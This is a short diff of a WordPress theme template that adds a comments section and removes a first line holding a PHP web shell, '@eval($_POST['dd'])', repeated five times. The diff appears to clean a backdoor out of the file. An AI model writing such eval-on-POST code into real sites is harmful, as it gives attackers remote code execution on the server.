@@ -1,4 +1,4 @@
-<?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php
+<?php
 get_header();
 ?>
 <div class="container">
@@ -14,6 +14,9 @@ get_header();
 			<?php endwhile;
 			endif; ?>
 	</div>
+        <div class="row">
+        <?php comments_template(); ?>
+        </div>
 </div>
 
 <?php 
